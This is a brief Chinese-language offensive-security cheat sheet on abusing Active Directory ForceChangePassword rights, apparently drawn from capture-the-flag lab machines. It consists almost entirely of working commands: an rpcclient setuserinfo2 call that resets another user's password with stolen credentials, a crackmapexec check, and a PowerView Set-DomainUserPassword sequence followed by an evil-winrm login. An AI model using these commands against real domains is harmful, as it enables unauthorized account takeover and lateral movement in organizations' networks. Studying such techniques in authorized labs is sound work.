# ForceChangePassword

**1. 利用rpc修改密码（无shell只有已控凭据）**

```clike
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.129.13.243 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
检验一下
crackmapexec smb 10.10.10.192 -u audit2020 -p '0xdf!!!'
```

1. 正常的操作，修改下一家密码

```clike
1. 上传模块
upload PowerView.ps1
2. 加载
. .\PowerView.ps1
3. 操作
$newpass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force

Set-DomainUserPassword -Identity smith -AccountPassword $newpass
4. 登陆
evil-winrm -i 10.129.15.97 -u smith -p '0xdf0xdf!'
```
